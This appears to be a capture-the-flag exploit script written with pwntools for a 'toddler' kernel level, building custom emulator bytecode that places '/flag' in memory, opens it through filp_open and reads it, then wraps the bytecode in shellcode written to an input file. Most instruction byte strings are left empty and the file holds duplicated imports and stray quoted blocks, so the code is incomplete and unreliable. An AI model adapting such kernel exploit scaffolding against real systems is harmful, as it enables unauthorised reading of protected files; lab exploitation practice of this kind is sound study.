


from pwn import *
context.arch = 'amd64'
from pwn import *
context.arch = 'amd64'
"""
ORDER =   op  

a = 0x8
b = 0x4 
c = 0x1
d = 0x20

"""
for i in range(1):
	# stm *c = d
	stmcd = b''
	# imm d 0x2f
	# imm c 0x80
	p1 = b'' + b'' + stmcd 

	# imm d 0x66
	# imm c 0x81
	p2 = b'' + b'' + stmcd

	# imm d 0x6c
	# imm c 0x82
	p3 = b'' + b'' + stmcd

	# imm d 0x61
	# imm c 0x83
	p4 = b'' + b'' + stmcd

	# imm d 0x67
	# imm c 0x84
	p5 = b'' + b'' + stmcd

	# imm d 0x00
	# imm c 0x85
	p6 = b'' + b'' + stmcd

	# imm a 0x80
	# imm b 0x0
	# imm c 0x0
	p7 = b'' + b'' + b''

	# filp open -> filp_open(a, b, c) d
	# 
	filp_open = b''

	# TODO: Read Syscall Memory
	# imm a 0x0
	# imm b 0x90
	# imm c 0x92
	q1 = b'' + b'' + b''
	# read_mem
	read_mem = b''



	# imm a 
	r1 =  bytes([i])+ b''
	# add b 10
	addb = b''
	# ldm d = b
	ldm = b''
	exit = b''


	stop = b'\x99\x99\x99'
	yancode = p1+p2+p3+p4+p5+p6+p7+filp_open+q1+read_mem+r1+addb+ldm+exit+ stop
	f = open(f"/home/ctf/2Toddler/inputs/teaching_input_{i}", 'wb')
	sc_user = asm(shellcraft.write(3, yancode, len(yancode)))
	f.write(sc_user)
	f.close()








"""




"""





"""

f = open("/home/ctf/2Toddler/teaching_input", 'wb')
#f.write(test)
sc_user = asm(shellcraft.write(3, yancode, len(yancode)))
# ./toddler2_level10_teaching1/userspace_program /proc/yan85 < /home/ctf/2Toddler/teaching_input
#f.write(sc_user)
#f.close()


f.write(sc_user)
f.close()


"""


